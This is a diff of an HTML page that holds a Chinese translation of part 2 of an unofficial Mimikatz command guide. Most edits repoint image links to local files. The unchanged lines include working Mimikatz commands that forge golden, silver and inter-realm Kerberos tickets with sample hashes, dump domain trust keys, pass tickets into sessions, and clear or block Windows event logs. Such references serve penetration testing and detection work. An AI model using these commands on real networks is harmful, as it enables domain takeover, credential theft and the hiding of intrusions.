@@ -3,7 +3,7 @@
 			<head>
 			     <title>Mimikatz 非官方指南和命令参考_Part2 - Her0in</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style><link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/pentesting/12521">http://drops.wooyun.org/pentesting/12521</a></h1>
 				
@@ -16,7 +16,7 @@
 
 <!--more-->
 
-<p><img src="http://static.wooyun.org//drops/20160129/20160129004320667761101.png" alt="p1"></p>
+<p><img src="../images_result/images/20160129004320667761101.png" alt="p1"></p>
 
 <h1>0x00 简介</h1>
 
@@ -252,7 +252,7 @@ Authentication Id : 0 ; 646260 (00000000:0009dc74)
 
 <p>CRYPTO::CAPI – （实验）是对 CryptoAPI 层的补丁，便于导出凭证数据。</p>
 
-<p><img src="http://static.wooyun.org//drops/20160129/2016012900432263030223.jpg" alt="p2"></p>
+<p><img src="../images_result/images/2016012900432263030223.jpg" alt="p2"></p>
 
 <h4><her0in id="CRYPTOCertificates"> CRYPTO::Certificates - 列出/导出 证书</her0in></h4>
 
@@ -283,7 +283,7 @@ Authentication Id : 0 ; 646260 (00000000:0009dc74)
 
 <h5>CRYPTO::Providers - 列出加密提供者</h5>
 
-<p><img src="http://static.wooyun.org//drops/20160129/2016012900432482839313.jpg" alt="p3"></p>
+<p><img src="../images_result/images/2016012900432482839313.jpg" alt="p3"></p>
 
 <h5>CRYPTO::Stores - 列出加密存储库</h5>
 
@@ -304,7 +304,7 @@ CERT_SYSTEM_STORE_USERS or USERS
 CERT_SYSTEM_STORE_SERVICES or SERVICES
 </code></pre>
 
-<p><img src="http://static.wooyun.org//drops/20160129/201601290043258443649.jpg" alt="p4"></p>
+<p><img src="../images_result/images/201601290043258443649.jpg" alt="p4"></p>
 
 <h3><her0in id="DPAPI"> DPAPI 模块 </her0in></h3>
 
@@ -322,11 +322,11 @@ CERT_SYSTEM_STORE_SERVICES or SERVICES
 
 <p>EVENT::Clear – 清空事件日志</p>
 
-<p><img src="http://static.wooyun.org//drops/20160129/2016012900432741089532.png" alt="p5"></p>
+<p><img src="../images_result/images/2016012900432741089532.png" alt="p5"></p>
 
 <p>EVENT:::Drop –（实验）对事件服务进行补丁，避免新的事件产生</p>
 
-<p><img src="http://static.wooyun.org//drops/20160129/2016012900432824447627.png" alt="p6"></p>
+<p><img src="../images_result/images/2016012900432824447627.png" alt="p6"></p>
 
 <h3><her0in id="KERBEROS"> KERBEROS 模块 </her0in></h3>
 
@@ -441,7 +441,7 @@ CERT_SYSTEM_STORE_SERVICES or SERVICES
 <p>命令示例：<br>
 <strong>.\mimikatz “kerberos::golden /admin:DarthVader /domain:rd.lab.adsecurity.org /id:9999 /sid:S-1-5-21-135380161-102191138-581311202 /krbtgt:13026055d01f235d67634e109da03321 /startoffset:0 /endin:600 /renewmax:10080 /ptt” exit</strong></p>
 
-<p><img src="http://static.wooyun.org//drops/20160129/2016012900432946018726.png" alt="p7"></p>
+<p><img src="../images_result/images/2016012900432946018726.png" alt="p7"></p>
 
 <p><strong>黄金票证参考</strong>：</p>
 
@@ -453,7 +453,7 @@ CERT_SYSTEM_STORE_SERVICES or SERVICES
 
 <p>下面是使用 diff 列出了 Mimikatz 代码的不同之处：</p>
 
-<p><img src="http://static.wooyun.org//drops/20160129/201601290043312453388.jpg" alt="p8"></p>
+<p><img src="../images_result/images/201601290043312453388.jpg" alt="p8"></p>
 
 <p>更多关于检测伪造的 Kerberos 票证（黄金票证，白银票证，等等）的不同之处，请看<a href="https://adsecurity.org/?p=1515#DetectingForgedKerberosTickets">这里</a>。</p>
 
@@ -506,7 +506,7 @@ CERT_SYSTEM_STORE_SERVICES or SERVICES
 
 <p><strong>mimikatz “kerberos::golden /admin:LukeSkywalker /id:1106 /domain:lab.adsecurity.org /sid:S-1-5-21-1473643419-774954089-2222329127 /target:adsmswin2k8r2.lab.adsecurity.org /rc4:d7e2b80507ea074ad59f152a1ba20458 /service:cifs /ptt” exit</strong></p>
 
-<p><img src="http://static.wooyun.org//drops/20160129/2016012900433222625924.png" alt="p9"></p>
+<p><img src="../images_result/images/2016012900433222625924.png" alt="p9"></p>
 
 <p><strong>更新于 1/5/2016：</strong></p>
 
@@ -514,7 +514,7 @@ CERT_SYSTEM_STORE_SERVICES or SERVICES
 
 <p>下面是使用 diff 列出了 Mimikatz 代码的不同之处：</p>
 
-<p><img src="http://static.wooyun.org//drops/20160129/201601290043312453388.jpg" alt="p10"></p>
+<p><img src="../images_result/images/201601290043312453388.jpg" alt="p10"></p>
 
 <p>更多关于检测伪造的 Kerberos 票证（黄金票证，白银票证，等等）的不同之处，请看<a href="https://adsecurity.org/?p=1515#DetectingForgedKerberosTickets">这里</a>。</p>
 
@@ -532,7 +532,7 @@ CERT_SYSTEM_STORE_SERVICES or SERVICES
 
 <p><a href="https://adsecurity.org/?page_id=1821#LSADUMP">(Mimikatz “privilege::debug” “lsadump::trust /patch” exit)</a></p>
 
-<p><img src="http://static.wooyun.org//drops/20160129/2016012900433424678103.jpg" alt="p11"></p>
+<p><img src="../images_result/images/2016012900433424678103.jpg" alt="p11"></p>
 
 <h4>第二步 使用 Mimikatz 创建伪造的信任票证（跨域 TGT）</h4>
 
@@ -586,13 +586,13 @@ CERT_SYSTEM_STORE_SERVICES or SERVICES
 
 <p><strong>Asktgs c:\temp\tickets\EA-ADSECLABCHILD.kirbi CIFS/ADSDC02.lab.adsecurity.org</strong></p>
 
-<p><img src="http://static.wooyun.org//drops/20160129/20160129004335845761110.jpg" alt="p12"></p>
+<p><img src="../images_result/images/20160129004335845761110.jpg" alt="p12"></p>
 
 <h4>第四步 利用第三步中创建的 TGS 文件并使用已经欺骗到手的权限访问目标服务</h4>
 
 <p><strong>Kirbikator lsa c:\temp\tickets\CIFS.ADSDC02.lab.adsecurity.org.kirbi</strong></p>
 
-<p><img src="http://static.wooyun.org//drops/20160129/2016012900433724879128.jpg" alt="p13"></p>
+<p><img src="../images_result/images/2016012900433724879128.jpg" alt="p13"></p>
 
 <ul>
 <li><strong>KERBEROS::Hash</strong> – 将密码哈希为密钥</li>
@@ -604,14 +604,14 @@ CERT_SYSTEM_STORE_SERVICES or SERVICES
 
 <p>请注意，在有些情况下，用户的凭证将不会被导出。这时候需要运行 <strong>SEKURLSA::Tickets /export</strong>（需要有适当的权限）。</p>
 
-<p><img src="http://static.wooyun.org//drops/20160129/20160129004338779451322.png" alt="p14"></p>
+<p><img src="../images_result/images/20160129004338779451322.png" alt="p14"></p>
 
 <p><strong>KERBEROS::PTC</strong> – 缓存传递（NT6）<br>
 *Nix 操作系统，如 Mac OS， Linux，BSD， Unix，等等会将 Kerberos 凭证进行缓存。这些已经被缓存的文件通过使用 Mimikatz 可以被复制以及传递。同样对将 Kerberos 票证注入到缓存文件中也很有用。</p>
 
 <p>一个很好的例子是在<a href="https://adsecurity.org/?p=676">使用 PyKEK 利用 MS14-068 漏洞</a>时所使用的 Mimikatz 的 <strong>kerberos::ptc</strong> 命令。PyKEK 生成了一个缓存文件，使用 Mimikatz 的 <strong>kerberos::ptc</strong> 命令可以注入操作。</p>
 
-<p><img src="http://static.wooyun.org//drops/20160129/2016012900434099613145.jpg" alt="p15"></p>
+<p><img src="../images_result/images/2016012900434099613145.jpg" alt="p15"></p>
 
 <h3><her0in id="KERBEROSPTT"><strong>KERBEROS::PTT – 票证传递</strong> </her0in></h3>
 
@@ -624,17 +624,17 @@ CERT_SYSTEM_STORE_SERVICES or SERVICES
 <li>/diretory – 指定所有将被注入的 .kirbi 文件的文件夹路径</li>
 </ul>
 
-<p><img src="http://static.wooyun.org//drops/20160129/20160129004342692041518.png" alt="p16"></p>
+<p><img src="../images_result/images/20160129004342692041518.png" alt="p16"></p>
 
 <p><strong>KERBEROS::Purge</strong> – 清除所有的 Kerberos 票证</p>
 
 <p>功能类似于 “klist purge” 。在传递票证（PTC，PTT，等）前运行此命令，并且确保使用了正确的用户上下文。</p>
 
-<p><img src="http://static.wooyun.org//drops/20160129/20160129004338779451322.png" alt="p17"></p>
+<p><img src="../images_result/images/20160129004338779451322.png" alt="p17"></p>
 
 <p><strong>KERBEROS::TGT</strong> – 获取当前用户的 TGT</p>
 
-<p><img src="http://static.wooyun.org//drops/20160129/20160129004343342351616.png" alt="p18"></p>      <p></p>
+<p><img src="../images_result/images/20160129004343342351616.png" alt="p18"></p>      <p></p>
     
 			</body>
 		</html>
